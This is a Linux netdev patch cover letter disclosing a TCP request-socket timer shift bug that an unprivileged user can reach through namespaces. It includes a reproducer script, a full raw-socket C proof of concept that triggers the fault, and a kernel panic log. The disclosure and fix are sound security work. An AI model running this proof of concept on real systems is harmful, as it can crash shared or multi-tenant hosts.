Received: from mail-pl1-f182.google.com (mail-pl1-f182.google.com [209.85.214.182])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2D63641D106
	for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 16:31:17 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.182
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785169879; cv=none; b=EJnnxmh7HeMps01Y4G1q2BG52iUbez/gi2uqwz+1PX2e3R25q6mljZqIPK05znc7QWFkenf4a7bDbTa9rp+vGpL/sYss3sZbdPGbq1OBqwgZa+Wdq6zEsXnvkuHOIBsC8wzuqzh09kljK1dY3LtwRUOd464b7OpmdKm/EQkeOn4=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785169879; c=relaxed/simple;
	bh=SGRkk27RTv8WfcvsqATJ7hoNnOWj8k4atjwWEpjxF0s=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=lhshba++24KWQhJ5ejkx6oge5VDxjsvFqLhfEIZKmGXEilm4nHyq7lr3IP2aOSS39ZHV6xD2kS7URLsa1KNdq/kbb5b4sjhC/M4fri6ECArh0tImPGZBpJHJ2qrz3dx7NGxbiARmpgIOEOmyZmB/0nlvxX/a8j+yXlLFJlNSIxU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=EVNoGTDj; arc=none smtp.client-ip=209.85.214.182
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="EVNoGTDj"
Received: by mail-pl1-f182.google.com with SMTP id d9443c01a7336-2cc7e86e7aeso32282365ad.2
        for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 09:31:17 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785169877; x=1785774677; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=6mEOK2ou1NYfPq8NvvsrRUFMqM6IUQ4K7WmE1fgv+WY=;
        b=EVNoGTDjUutT8PQQJkVTxRFQbAjSsJPQSpD+EAWbiG6i4zSiiQ9x0vs6URZ4pfWKev
         fRxwrpMwA6Oh/TsVTPPWm4FJ0n3OPNdCR0J090Ds+DaXuxAC/yBN61A3D4mCRBddl82R
         F8QoZfzSk8sRZyBvMB7cKfbbxoq/xQe0Q6pSXqEwjZ56vnhPUdcuR6Zb4bTAop74BgWM
         PTQO3XOxAFf+6BzNkKusNVfT11ECiD6dNxzZLdWCGshN8+6iDP9RTpW+UufefAjqd+0h
         LCeF5+ngxINAF/Kk4drsXYhX5rkqlK68XlCshk122SVsGdtM4sM7mXb+wMaw5ojkEck6
         zpIw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785169877; x=1785774677;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=6mEOK2ou1NYfPq8NvvsrRUFMqM6IUQ4K7WmE1fgv+WY=;
        b=cfB5HqhrFgHzhv2jTXVczV5HJU0rFij/SLmaRC0qkGJF0QnK6n0w1egrA11DA3ERRc
         1eTr1l7GjoxbHAQqWQz23Pci0mTkq3+nPe/Qbbmej/0xNzR+wYBtW7+3zgWhulTZYZz6
         a2xGE1gc/L6pr0frkzZGs21pjGvxYNdmK5IzJOyeCCAVkvBYypGDMvF/EC/ulQFpwyng
         OWs4pYukVm5YGKc3dZfMDCGpxEg4s/+8eRYrp5QNuuygFEnjJjx/7iRURK4hdQX3D0m2
         wbE5AxpPpSKbclUsx0C7ncyEcAi72qiYI+TR4h79UToJO7gG7vjZ3/91BdwXlOv2mSkZ
         o0TQ==
X-Gm-Message-State: AOJu0Yy1nrNj9DXFYh9/igA3QtHApzR2M6t/WfMuL4JQfubu54a98Xkc
	LHNrso48KpbXYmHrxTWL8wGK6hvqSUTsSTFvfhGZqn92L3mpb96O8K7bzAgTa7cYFjI=
X-Gm-Gg: AR+sD11RCMf6fHCa3cYzDytriOh44bxftwGpLqvGESaRR4jyPLCP4qzZ2EuU1xJSwbX
	EnRFQAl9uBhE7fUeBKM7gqZA17m6PlyuR0gx7Ex4uuGCrB76d6jH6ImOsZisZVO2dzF+rSo1N0J
	yR6l0dCJIxXk3ZjO+RIlz1H4IKIW2qAhPXLXKuorKCwicaK36psOv8VLiz/tUulL2OrKp/js6uy
	oVUV8CgN5rIOT561hVfX+qnuQOUlOeLyUqb9M10b6pUSKizOkz0b/3zgZBoaOJiUY0G5t0y7mZA
	7ZWn+UXH+Zz33fJeIO401TxcemikN5ildzf/e6eqW4SMFHj5ipxv940jm916sGeQZb2u9Y4tRlu
	pnoASXmTi3+5c362VfDZQVWH1B48bMcgLX8eRKr84it5e/PsOVIfRXGzJy1aIf3bm88Qee5a4oz
	xa2NRzjjDNBBZg2b2lAAPrirbow1/iQi4=
X-Received: by 2002:a17:902:fdb0:b0:2c9:fa31:850c with SMTP id d9443c01a7336-2cfde87c99fmr83313375ad.39.1785169877166;
        Mon, 27 Jul 2026 09:31:17 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2cfde5e3e0asm37733635ad.29.2026.07.27.09.31.14
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 27 Jul 2026 09:31:16 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netdev@vger.kernel.org
Cc: edumazet@google.com,
	ncardwell@google.com,
	kuniyu@google.com,
	davem@davemloft.net,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH net v4 resend 0/1] tcp: bound SYN-ACK timers to reqsk timeout range
Date: Tue, 28 Jul 2026 00:31:09 +0800
Message-ID: <cover.1784735392.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/inet_connection_sock.c.
The bug is reachable by a non-root user via user and net namespace.

We've tested it, and it should not affect normal TCP request socket
timeout handling.

The issue is caused by allowing SYN-ACK timer limits above the range
that request socket timeout backoff can safely consume.

---- details below ----

Bug details:

tcp_synack_retries is exposed through proc_dou8vec_minmax without an
upper bound, so values up to 255 are accepted. The effective request
socket timer limit can also come from TCP_SYNCNT through
icsk_syn_retries, or from TCP_DEFER_ACCEPT through rskq_defer_accept.

The regular request socket timer and the Fast Open SYN-ACK timer use
these limits to decide when a request should expire. However, after
req->num_timeout is incremented, the timer paths use it as a shift
count while computing the next timeout. Excessive retry or
defer-accept limits can therefore drive these timer paths into invalid
shift counts before the request expires. Values beyond the 7-bit
request socket timeout counter can also prevent expiration from being
reached at all.

The attached patch clamps the effective retry and defer-accept limits
in the regular request socket timer path, clamps the Fast Open retry
limit, and makes the request socket timeout helper saturate before
shifting. This keeps sysctl writes unchanged while bounding the timer
calculations.

Reproducer:

    gcc -O2 -Wall -o poc poc.c
    unshare -Urn sh -c '\''
        ip link set lo up
        echo 1 > /proc/sys/kernel/panic_on_warn
        echo 0 > /proc/sys/net/ipv4/tcp_syncookies
        echo 128 > /proc/sys/net/ipv4/tcp_synack_retries
        echo 1000 > /proc/sys/net/ipv4/tcp_rto_max_ms
        ./poc 127.0.0.2 40000 127.0.0.1 12345
    '\''

We ran the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

struct pseudo_header {
	uint32_t src_addr;
	uint32_t dst_addr;
	uint8_t zero;
	uint8_t protocol;
	uint16_t tcp_len;
};

static uint16_t checksum(const void *data, size_t len)
{
	const uint16_t *words = data;
	uint32_t sum = 0;

	while (len > 1) {
		sum += *words++;
		len -= 2;
	}

	if (len)
		sum += *(const uint8_t *)words;

	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);

	return (uint16_t)~sum;
}

int main(int argc, char **argv)
{
	struct sockaddr_in dst = { 0 };
	struct pseudo_header psh = { 0 };
	struct {
		struct iphdr ip;
		struct tcphdr tcp;
	} packet = { 0 };
	unsigned char pseudo_buf[sizeof(psh) + sizeof(packet.tcp)];
	const char *src_ip;
	const char *dst_ip;
	int sock;
	int one = 1;
	long src_port;
	long dst_port;
	ssize_t sent;

	if (argc != 5) {
		fprintf(stderr, "usage: %s <src_ip> <src_port> <dst_ip> <dst_port>\n", argv[0]);
		return 2;
	}

	src_ip = argv[1];
	src_port = strtol(argv[2], NULL, 10);
	dst_ip = argv[3];
	dst_port = strtol(argv[4], NULL, 10);
	if (src_port <= 0 || src_port > 65535 || dst_port <= 0 || dst_port > 65535) {
		fprintf(stderr, "invalid port\n");
		return 2;
	}

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sock < 0) {
		perror("socket");
		return 1;
	}

	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
		perror("setsockopt(IP_HDRINCL)");
		close(sock);
		return 1;
	}

	dst.sin_family = AF_INET;
	dst.sin_port = htons((uint16_t)dst_port);
	if (inet_pton(AF_INET, dst_ip, &dst.sin_addr) != 1) {
		fprintf(stderr, "invalid dst_ip: %s\n", dst_ip);
		close(sock);
		return 2;
	}

	packet.ip.version = 4;
	packet.ip.ihl = sizeof(packet.ip) / 4;
	packet.ip.tos = 0;
	packet.ip.tot_len = htons(sizeof(packet));
	packet.ip.id = htons((uint16_t)getpid());
	packet.ip.frag_off = 0;
	packet.ip.ttl = 64;
	packet.ip.protocol = IPPROTO_TCP;
	if (inet_pton(AF_INET, src_ip, &packet.ip.saddr) != 1) {
		fprintf(stderr, "invalid src_ip: %s\n", src_ip);
		close(sock);
		return 2;
	}
	packet.ip.daddr = dst.sin_addr.s_addr;
	packet.ip.check = checksum(&packet.ip, sizeof(packet.ip));

	packet.tcp.source = htons((uint16_t)src_port);
	packet.tcp.dest = htons((uint16_t)dst_port);
	packet.tcp.seq = htonl(0x12345678);
	packet.tcp.doff = sizeof(packet.tcp) / 4;
	packet.tcp.syn = 1;
	packet.tcp.window = htons(65535);

	psh.src_addr = packet.ip.saddr;
	psh.dst_addr = packet.ip.daddr;
	psh.zero = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_len = htons(sizeof(packet.tcp));
	memcpy(pseudo_buf, &psh, sizeof(psh));
	memcpy(pseudo_buf + sizeof(psh), &packet.tcp, sizeof(packet.tcp));
	packet.tcp.check = checksum(pseudo_buf, sizeof(pseudo_buf));

	sent = sendto(sock, &packet, sizeof(packet), 0,
		      (struct sockaddr *)&dst, sizeof(dst));
	if (sent != (ssize_t)sizeof(packet)) {
		if (sent < 0)
			perror("sendto");
		else
			fprintf(stderr, "short send: %zd\n", sent);
		close(sock);
		return 1;
	}

	close(sock);
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  463.180218][    C3] Kernel panic - not syncing: UBSAN: panic_on_warn set ...
[  463.181502][    C3] CPU: 3 UID: 0 PID: 0 Comm: swapper/3 Not tainted 7.1.0-rc1 #2 PREEMPT(full)
[  463.182748][    C3] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  463.184251][    C3] Call Trace:
[  463.184723][    C3]  <IRQ>
[  463.185125][    C3]  vpanic+0x6c3/0x790
[  463.185795][    C3]  ? __pfx_vpanic+0x10/0x10
[  463.186461][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  463.187264][    C3]  ? __show_trace_log_lvl+0x2f1/0x420
[  463.188052][    C3]  panic+0xca/0xd0
[  463.188605][    C3]  ? __pfx_panic+0x10/0x10
[  463.189281][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  463.190089][    C3]  check_panic_on_warn+0x61/0x80
[  463.190816][    C3]  __ubsan_handle_shift_out_of_bounds+0x1dd/0x2d0
[  463.191774][    C3]  reqsk_timer_handler.cold+0x18/0x26
[  463.192570][    C3]  ? __pfx_reqsk_timer_handler+0x10/0x10
[  463.193389][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  463.194218][    C3]  ? __pfx_reqsk_timer_handler+0x10/0x10
[  463.195181][    C3]  call_timer_fn+0x16b/0x500
[  463.196028][    C3]  ? debug_object_deactivate+0x2e4/0x3b0
[  463.197045][    C3]  ? trace_softirq_raise+0x11a/0x160
[  463.197852][    C3]  ? __pfx_call_timer_fn+0x10/0x10
[  463.198593][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  463.199411][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  463.200213][    C3]  ? rcu_is_watching+0x12/0xc0
[  463.200904][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  463.201763][    C3]  __run_timers+0x5d9/0x9c0
[  463.202468][    C3]  ? __pfx_reqsk_timer_handler+0x10/0x10
[  463.203308][    C3]  ? __pfx___run_timers+0x10/0x10
[  463.204049][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  463.204871][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  463.205704][    C3]  run_timer_base+0xfe/0x170
[  463.206370][    C3]  ? __pfx_run_timer_base+0x10/0x10
[  463.207115][    C3]  ? rcu_is_watching+0x12/0xc0
[  463.207809][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  463.208619][    C3]  run_timer_softirq+0x10/0x30
[  463.209311][    C3]  handle_softirqs+0x1ef/0xa00
[  463.210022][    C3]  ? __pfx_handle_softirqs+0x10/0x10
[  463.210788][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  463.211590][    C3]  __irq_exit_rcu+0x169/0x210
[  463.212281][    C3]  irq_exit_rcu+0xe/0x30
[  463.212885][    C3]  sysvec_apic_timer_interrupt+0xa3/0xc0
[  463.213688][    C3]  </IRQ>
[  463.214105][    C3]  <TASK>
[  463.214538][    C3]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[  463.215398][    C3] RIP: pv_native_safe_halt+0xf/0x20
[  463.216189][    C3] Code: 77 5b 02 e9 de d9 80 f6 0f 1f 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa eb 07 0f 00 2d d3 32 1a 00 fb f4 <e9> b7 d9 80 f6 66 2e 0f 1f 84 00 00 00 00 00 66 90 90 90 90 90 90
All code
========
   0:	77 5b                	ja     0x5d
   2:	02 e9                	add    %cl,%ch
   4:	de d9                	fcompp
   6:	80 f6 0f             	xor    $0xf,%dh
   9:	1f                   	(bad)
   a:	00 90 90 90 90 90    	add    %dl,-0x6f6f6f70(%rax)
  10:	90                   	nop
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
  15:	90                   	nop
  16:	90                   	nop
  17:	90                   	nop
  18:	90                   	nop
  19:	90                   	nop
  1a:	90                   	nop
  1b:	f3 0f 1e fa          	endbr64
  1f:	eb 07                	jmp    0x28
  21:	0f 00 2d d3 32 1a 00 	verw   0x1a32d3(%rip)        # 0x1a32fb
  28:	fb                   	sti
  29:	f4                   	hlt
  2a:*	e9 b7 d9 80 f6       	jmp    0xfffffffff680d9e6		<-- trapping instruction
  2f:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  36:	00 00 00 
  39:	66 90                	xchg   %ax,%ax
  3b:	90                   	nop
  3c:	90                   	nop
  3d:	90                   	nop
  3e:	90                   	nop
  3f:	90                   	nop

Code starting with the faulting instruction
===========================================
   0:	e9 b7 d9 80 f6       	jmp    0xfffffffff680d9bc
   5:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   c:	00 00 00 
   f:	66 90                	xchg   %ax,%ax
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
  15:	90                   	nop
[  463.218880][    C3] RSP: 0018:ffa000000017fdf0 EFLAGS: 00000202
[  463.219748][    C3] RAX: 00000000001a917f RBX: ff110001036c25c0 RCX: ffffffff8a8f7fa5
[  463.220859][    C3] RDX: 0000000000000000 RSI: ffffffff8cc14de4 RDI: ffffffff8b0f3640
[  463.221969][    C3] RBP: 0000000000000000 R08: 0000000000000001 R09: ffe21c0022fb67ed
[  463.223076][    C3] R10: ff11000117db3f6b R11: 0000000000000072 R12: 0000000000000003
[  463.224187][    C3] R13: ffe21c00206d84b8 R14: 0000000000000003 R15: ffffffff90914550
[  463.225338][    C3]  ? ct_kernel_exit+0x125/0x180
[  463.226067][    C3]  default_idle+0x9/0x10
[  463.226686][    C3]  default_idle_call+0x6c/0xb0
[  463.227379][    C3]  do_idle+0x469/0x590
[  463.227983][    C3]  ? __pfx_do_idle+0x10/0x10
[  463.228645][    C3]  ? finish_task_switch.isra.0+0x151/0x1050
[  463.229524][    C3]  cpu_startup_entry+0x54/0x60
[  463.230222][    C3]  start_secondary+0x213/0x2b0
[  463.230905][    C3]  ? __pfx_start_secondary+0x10/0x10
[  463.231687][    C3]  common_startup_64+0x13e/0x148
[  463.232457][    C3]  </TASK>
[  463.233555][    C3] Kernel Offset: disabled
[  463.234244][    C3] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  tcp: bound SYN-ACK timers to reqsk timeout range

 include/net/tcp.h               | 19 +++++++++++++++----
 net/ipv4/inet_connection_sock.c |  6 +++++-
 net/ipv4/tcp_timer.c            |  3 ++-
 3 files changed, 22 insertions(+), 6 deletions(-)

-- 
2.43.0
